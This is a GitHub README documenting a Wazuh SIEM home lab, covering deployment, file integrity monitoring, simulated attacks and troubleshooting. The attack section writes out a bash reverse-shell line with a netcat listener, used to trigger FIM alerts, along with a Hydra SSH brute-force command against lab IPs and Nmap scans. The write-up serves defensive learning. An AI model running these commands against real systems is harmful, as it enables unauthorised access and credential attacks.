<div align="center">

# 🛡️ Wazuh SOC Home Lab

### *Because reading about SIEM is not the same as breaking one and fixing it.*

![Wazuh](https://img.shields.io/badge/Wazuh-v4.12.0-005571?style=for-the-badge&logo=wazuh&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-26.04_LTS-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Kali](https://img.shields.io/badge/Kali_Linux-2026.1-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Apple Silicon](https://img.shields.io/badge/Apple_Silicon-ARM64-000000?style=for-the-badge&logo=apple&logoColor=white)
![VMware](https://img.shields.io/badge/VMware_Fusion-ARM64-607078?style=for-the-badge&logo=vmware&logoColor=white)
![Status](https://img.shields.io/badge/Status-Complete-2ea44f?style=for-the-badge)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-FF0000?style=for-the-badge)

<br/>

> Built, broken, recovered, and validated a complete Wazuh SOC environment on Apple Silicon, documenting every failure along the way.
>
> **Most home labs stop when the dashboard loads. This one starts there.**

<br/>

---

</div>

## 🚨 What Makes This Lab Different?

Most Wazuh projects stop after installation. This project documents the complete lifecycle of a SOC platform: deployment, configuration, detection validation, attack simulation, failure recovery, and performance troubleshooting.

### Highlights

✅ Apple Silicon (ARM64) deployment

✅ Live endpoint monitoring

✅ File Integrity Monitoring validation

✅ MITRE ATT&CK mapping

✅ Multi-stage attack simulation (FIM, brute force, recon)

✅ Real-world troubleshooting

✅ End-to-end alert verification

❌ Not a pre-built VM &nbsp; ❌ Not a copy-paste Docker deployment &nbsp; 

The goal was not simply to install Wazuh. The goal was to understand how a SIEM behaves when things break, and when it is attacked.

---

## 📌 Table of Contents

- [What I Built](#-what-i-built)
- [Lab Statistics](#-lab-statistics)
- [Architecture](#️-architecture)
- [Installation & Setup](#-installation--setup)
- [Key Detections](#-key-detections)
- [Attack Simulation](#-attack-simulation)
- [SOC Analyst Investigation Example](#️-soc-analyst-investigation-example)
- [Troubleshooting War Stories](#-troubleshooting-war-stories)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [What I Learned](#-what-i-learned)
- [Skills Demonstrated](#-skills-demonstrated)

---

## 🎯 What I Built

Built from a clean Ubuntu Server installation and configured entirely by hand. The environment was deployed, monitored, broken, repaired, attacked, and validated to understand how a real SOC platform behaves beyond the installation stage.

| Capability | Status |
|---|---|
| SIEM stack deployed (manager + indexer + dashboard) | ✅ Complete |
| Live endpoint enrolled and reporting | ✅ Complete |
| Real-time auth event detection (SSH, sudo, PAM) | ✅ Complete |
| File Integrity Monitoring end-to-end | ✅ Complete |
| FIM attack simulation and detection | ✅ Complete |
| Brute force attack simulation (Hydra) | ✅ Complete |
| Network reconnaissance detection (Nmap) | ✅ Complete |
| Disk failure diagnosis and recovery | ✅ Complete |
| MITRE ATT&CK mapping verified in dashboard | ✅ Complete |

---

## 📊 Lab Statistics

| Metric | Value |
|---|---|
| Virtual Machines | 2 |
| Operating Systems | Ubuntu Server 26.04 + Kali Linux 2026.1 |
| SIEM Platform | Wazuh v4.12.0 |
| Endpoints Monitored | 1 |
| Security Events Generated | 197+ |
| Attack Types Simulated | 3 (FIM, Brute Force, Recon) |
| Major Failures Diagnosed | 3 |
| MITRE Techniques Detected | 6 |
| Alert Pipeline Validation | Complete |

---

## 🏗️ Architecture

<div align="center">

```
┌─────────────────────────────────────────────┐
│           macOS Host — MacBook Pro M4        │
│                  VMware Fusion               │
└────────────────┬────────────────────────────┘
                 │
      ┌──────────┴──────────┐
      │                     │
┌─────▼──────────┐   ┌──────▼──────────┐
│  cyber-nova    │   │   kali-agent    │
│ Ubuntu 26.04   │   │ Kali Linux      │
│ 192.168.50.200 │◄──│ 192.168.50.191  │
│                │   │                 │
│ Wazuh Manager  │   │ Wazuh Agent     │
│ Wazuh Indexer  │   │ v4.12.0         │
│ Wazuh Dashboard│   │ + Attacker      │
│ (port 443)     │   │ (Hydra, Nmap)   │
└────────────────┘   └─────────────────┘
```

</div>

**Network:** Bridged networking, both VMs on the same subnet, bidirectional ping verified before deployment.

---

## 🚀 Installation & Setup

### Phase 1 - Network Verification

Before touching Wazuh, I verified bidirectional connectivity between both VMs.

<div align="center">
  <img src="Lab%20Screenshots/01-setup/01-kali-ping-ubuntu.png" width="700">
  <p><em>Kali pinging Ubuntu (192.168.50.200)</em></p>
  <img src="Lab%20Screenshots/01-setup/02-ubuntu-ping-kali.png" width="700">
  <p><em>Ubuntu pinging Kali (192.168.50.191)</em></p>
</div>

---

### Phase 2 - Wazuh Stack Installation

```bash
curl -sO https://packages.wazuh.com/4.12/wazuh-install.sh
sudo bash ./wazuh-install.sh -a -i
```

**ARM64 Challenge:** The standard install script flags Apple Silicon as unsupported hardware. The `-i` flag bypasses this check and the install runs perfectly on aarch64.

<div align="center">
  <img src="Lab%20Screenshots/02-installation/02-installation%3A01-ssh-install-start.png" width="700">
  <p><em>SSH into Ubuntu and start the install</em></p>
</div>

**Port conflict:** The install initially failed because SafeLine WAF Docker containers from my previous lab were holding port 443.

```bash
sudo sh -c 'docker stop $(docker ps -q)'
sudo bash ./wazuh-install.sh -a -i
```

<div align="center">
  <img src="Lab%20Screenshots/02-installation/02-installation%3A02-port-conflict-docker.png" width="700">
  <p><em>Port 443 conflict and stopping Docker containers</em></p>
  <img src="Lab%20Screenshots/02-installation/02-installation%3A03-install-i-flag.png" width="700">
  <p><em>Re-running install with the -i flag</em></p>
  <img src="Lab%20Screenshots/02-installation/02-installation%3A04-install-success.png" width="700">
  <p><em>Successful install, all components green</em></p>
</div>

---

### Phase 3 - Dashboard Access

Accessed the dashboard from Kali's browser at `https://192.168.50.200` using credentials generated during install.

<div align="center">
  <img src="Lab%20Screenshots/02-installation/02-installation%3A05-wazuh-login.png" width="700">
  <p><em>Wazuh login page</em></p>
  <img src="Lab%20Screenshots/02-installation/02-installation%3A06-dashboard-overview.png" width="700">
  <p><em>Wazuh dashboard overview</em></p>
</div>

---

### Phase 4 - Agent Deployment

Deployed the Wazuh agent on Kali using the dashboard's guided installer, selecting the Linux DEB aarch64 package.

```bash
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.12.0-1_arm64.deb \
&& sudo WAZUH_MANAGER='192.168.50.200' WAZUH_AGENT_NAME='kali-agent' dpkg -i ./wazuh-agent_4.12.0-1_arm64.deb
sudo systemctl daemon-reload && sudo systemctl enable wazuh-agent && sudo systemctl start wazuh-agent
```

<div align="center">
  <img src="Lab%20Screenshots/03-agent-deployment/03-agent-deployment%3A01-agent-config.png" width="700">
  <p><em>Agent configuration in the dashboard</em></p>
  <img src="Lab%20Screenshots/03-agent-deployment/03-agent-deployment%3A02-agent-download.png" width="700">
  <p><em>Agent package download on Kali</em></p>
  <img src="Lab%20Screenshots/03-agent-deployment/03-agent-deployment%3A03-agent-install.png" width="700">
  <p><em>Agent installation</em></p>
  <img src="Lab%20Screenshots/03-agent-deployment/03-agent-deployment%3A04-agent-running.png" width="700">
  <p><em>Agent service running</em></p>
  <img src="Lab%20Screenshots/03-agent-deployment/03-agent-deployment%3A05-agent-active.png" width="700">
  <p><em>kali-agent showing ACTIVE in Endpoints</em></p>
</div>

---

### Phase 5 - FIM Configuration

Edited the agent's `ossec.conf` to add realtime monitoring of `/home/kali/test`:

```xml
<directories check_all="yes" realtime="yes">/home/kali/test</directories>
```

<div align="center">
  <img src="Lab%20Screenshots/04-fim-config/04-fim-config%3A01-ossec-conf.png" width="700">
  <p><em>ossec.conf FIM configuration</em></p>
  <img src="Lab%20Screenshots/04-fim-config/04-fim-config%3A02-fim-realtime.png" width="700">
  <p><em>Realtime monitoring enabled</em></p>
</div>

---

## 🔍 Key Detections

### Authentication Events

| Rule ID | Description | Level |
|---|---|---|
| 5501 | PAM Login session opened | 3 |
| 5502 | PAM Login session closed | 3 |
| 5402 | Successful sudo to ROOT executed | 3 |
| 5403 | First time user executed sudo | 4 |

### File Integrity Monitoring

**Alert pipeline:** Agent → wazuh-analysisd → alerts.json → wazuh-indexer → dashboard. Each alert captured the file path, event type, MD5/SHA1/SHA256 hashes, permissions, and agent ID.

---

## 💥 Attack Simulation

This lab simulated three distinct attack types, each detected and mapped to MITRE ATT&CK.

### 1. File Integrity Monitoring Attack

Simulated suspicious file activity on the monitored endpoint:

```bash
echo "nc -lvnp 4444" > ~/test/backdoor.sh
echo "bash -i >& /dev/tcp/192.168.50.200/4444 0>&1" >> ~/test/backdoor.sh
chmod +x ~/test/backdoor.sh
mv ~/test/backdoor.sh ~/test/system_update.sh
rm ~/test/system_update.sh
```

File creation, permission change, rename, and deletion, every action detected in realtime.

<div align="center">
  <img src="Lab%20Screenshots/05-attack-simulation/05-attack-simulation%3A01-fim-attack-commands.png" width="700">
  <p><em>Attack simulation commands</em></p>
  <img src="Lab%20Screenshots/05-attack-simulation/05-attack-simulation%3A02-fim-alert-json-hashes.png" width="700">
  <p><em>FIM alert in alerts.json with full hash capture</em></p>
  <img src="Lab%20Screenshots/05-attack-simulation/05-attack-simulation%3A03-fim-dashboard-4hits.png" width="700">
  <p><em>FIM alerts in the dashboard</em></p>
</div>

---

### 2. SSH Brute Force Attack (Hydra)

Launched a real dictionary attack against Ubuntu SSH using Hydra and the rockyou wordlist:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.200 -t 4 -V
```

Wazuh detected the attack across multiple rule levels:

| Rule ID | Description | Level |
|---|---|---|
| 5710 | sshd: Attempt to login using a non-existent user | 5 |
| 5712 | sshd: brute force trying to get access to the system | 10 |
| 5758 | Maximum authentication attempts exceeded | 8 |
| 2502 | syslog: User missed the password more than one time | 10 |

**The defence worked:** Ubuntu's SSH connection limits kicked in and the attack stalled. Hydra reported `all children were disabled due too many connection errors` and `0 valid password found`. The attack failed and was fully logged.

<div align="center">
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A01-ssh-fail-events.png" width="700">
  <p><em>SSH authentication failure events</em></p>
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A02-ssh-nonexistent-user.png" width="700">
  <p><em>Login attempts on non-existent users</em></p>
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A07-rockyou-wordlist.png" width="700">
  <p><em>Preparing the rockyou wordlist</em></p>
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A08-hydra-running.png" width="700">
  <p><em>Hydra running against Ubuntu SSH</em></p>
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A09-hydra-blocked.png" width="700">
  <p><em>Hydra blocked, 0 passwords found</em></p>
</div>

---

### 3. Network Reconnaissance (Nmap)

Simulated attacker reconnaissance with host discovery and service scanning:

```bash
nmap -sn 192.168.50.0/24      # Host discovery, found 60 live hosts
nmap -sV 192.168.50.200       # Service/version scan
```

The service scan exposed open ports on the manager: SSH (22), HTTPS (443), and Apache (8080).

<div align="center">
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A05-nmap-host.png" width="700">
  <p><em>Nmap host discovery, 60 live hosts</em></p>
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A06-nmap-service-scan.png" width="700">
  <p><em>Nmap service and version scan</em></p>
</div>

---

## 🕵️ SOC Analyst Investigation Example

### Scenario

Multiple high-severity authentication alerts fired in a short window from a single source, a classic brute force signature.

### Investigation Process

1. Verify alert source and affected endpoint
2. Review rule IDs and severity levels (5712, 5758, 2502)
3. Correlate timestamp clustering, many failures in seconds
4. Validate MITRE ATT&CK mapping (T1110 Brute Force, T1078 Valid Accounts)
5. Confirm whether any attempt succeeded (it did not)
6. Determine response, connection throttling already mitigated the attack

<div align="center">
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A03-mitre-credential-access.png" width="700">
  <p><em>MITRE Credential Access mapping</em></p>
  <img src="Lab%20Screenshots/06-bruteforce-recon/06-bruteforce-recon%3A04-mitre-password-guessing.png" width="700">
  <p><em>T1110.001 Password Guessing technique detail</em></p>
</div>

### Outcome

The activity was confirmed as a controlled Hydra brute force simulation. Detection coverage functioned correctly, all attempts were logged, MITRE mappings appeared in the dashboard, and no credentials were compromised.

---

## 🔥 Troubleshooting War Stories

This is where most lab writeups stop. Mine doesn't.

### 💾 War Story 1 — Disk hit 100% and the manager died

```bash
df -h /
# 28G 28G 0 100%
sudo du -h --max-depth=2 /var/ossec | sort -h | tail -15
# 6.4G /var/ossec/queue/vd_updater  ← culprit
```

```bash
sudo systemctl stop wazuh-manager
sudo rm -rf /var/ossec/queue/vd_updater
sudo mkdir -p /var/ossec/queue/vd_updater
sudo chown wazuh:wazuh /var/ossec/queue/vd_updater
sudo systemctl start wazuh-manager
```

<div align="center">
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A01-disk-full-diagnosis.png" width="700">
  <p><em>Disk at 100%, diagnosing the cause</em></p>
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A02-disk-recovery.png" width="700">
  <p><em>Clearing the CVE feed directory</em></p>
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A03-cleanup-continued.png" width="700">
  <p><em>Cleanup continued</em></p>
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A04-manager-restored.png" width="700">
  <p><em>Manager restored and running</em></p>
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A05-vuln-detection-disabled.png" width="700">
  <p><em>Vulnerability detection disabled to prevent recurrence</em></p>
</div>

---

### 📦 War Story 2 - LVM using only half its allocated space

```bash
sudo vgs
# ubuntu-vg  56.95g  28.47g available but unused
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
# Result: 56G  23G  32G  42%
```

<div align="center">
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A06-lvm-expanded-56gb.png" width="700">
  <p><em>LVM extended from 28GB to 56GB</em></p>
  <img src="Lab%20Screenshots/07-troubleshooting/07-troubleshooting%3A07-indexer-health-green.png" width="700">
  <p><em>Indexer health back to green</em></p>
</div>

---

### 🔍 War Story 3 - FIM alerts invisible in dashboard

Searched everywhere on the agent. Nothing appeared. The mistake: **agents don't generate alerts, managers do.**

```bash
# On UBUNTU (manager), not Kali:
sudo grep syscheck /var/ossec/logs/alerts/alerts.json | tail -5
# ERROR: dbsync: Bad response from database: Cannot save Syscheck
```

FIM database was corrupted. Rebuilt wazuh-db, restarted pipeline. Alerts appeared immediately.

**Key lesson:** Always debug the manager-side pipeline, not the agent side. The agent watches and sends. The manager decides what becomes an alert.

---

## 🎯 MITRE ATT&CK Mapping

Six techniques were detected and mapped automatically across all three attack types:

| Tactic | Technique ID | Technique Name | Triggered By |
|---|---|---|---|
| Credential Access | T1110 | Brute Force | Hydra SSH attack |
| Credential Access | T1110.001 | Password Guessing | Hydra SSH attack |
| Lateral Movement | T1021 | Remote Services | SSH login attempts |
| Initial Access | T1078 | Valid Accounts | PAM authentication events |
| Privilege Escalation | T1548 | Sudo and Sudo Caching | sudo commands on Kali |
| Defense Evasion | T1548 | Abuse Elevation Control | sudo escalation |

<div align="center">
  <img src="Lab%20Screenshots/08-mitre-dashboard/08-mitre-dashboard%3A09-mitre-full-dashboard.png" width="700">
  <p><em>Full MITRE ATT&CK dashboard</em></p>
  <img src="Lab%20Screenshots/08-mitre-dashboard/08-mitre-dashboard%3A06-dashboard-197-alerts.png" width="700">
  <p><em>Threat Hunting dashboard, 197 alerts</em></p>
  <img src="Lab%20Screenshots/08-mitre-dashboard/08-mitre-dashboard%3A05-mitre-events-techniques.png" width="700">
  <p><em>MITRE events with technique IDs</em></p>
  
</div>

---

## 💡 What I Learned

- How the Wazuh alert pipeline works end to end, by breaking each stage and fixing it
- Linux disk management under pressure, LVM extension, live filesystem resize
- Agents watch and send. Managers process and alert. Never debug on the wrong machine.
- Raw logs (`ossec.log`, `alerts.json`) tell the truth when the UI shows nothing
- How real attacks (brute force, recon) appear in a SIEM and map to MITRE ATT&CK
- How connection throttling can mitigate a brute force attack before it succeeds

A full breakdown is available in [LESSONS-LEARNED.md](LESSONS-LEARNED.md).

---

## 🎓 Skills Demonstrated

`Wazuh SIEM` `Log Analysis` `FIM` `Endpoint Monitoring` `Alert Triage` `Incident Response` `Threat Hunting` `Brute Force Detection` `Hydra` `Nmap` `MITRE ATT&CK` `Linux Admin` `LVM` `VMware Fusion` `ARM64` `Troubleshooting` `OpenSearch`

---

<div align="center">

**Samruddhi Patil** — Aspiring SOC/Cyber Analyst

I am an aspiring SOC Analyst with a strong interest in threat detection, SIEM engineering, incident response, and blue team operations. This project was built to gain hands-on experience deploying, troubleshooting, attacking, and defending enterprise security infrastructure in a controlled lab environment.

🎓 CompTIA Security+ &nbsp;|&nbsp; Microsoft SC-900 &nbsp;|&nbsp; EC-Council CASE (Java) &nbsp;|&nbsp; Google Cybersecurity

<br/>

[![GitHub](https://img.shields.io/badge/GitHub-samSecurity04-181717?style=for-the-badge&logo=github)](https://github.com/samSecurity04)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-samruddhi--p--patil-0A66C2?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/samruddhi-p-patil/)

<br/>

*This lab was built entirely for educational and cybersecurity skill development purposes.*

*All attack simulations were conducted in an isolated home lab environment.*

</div>
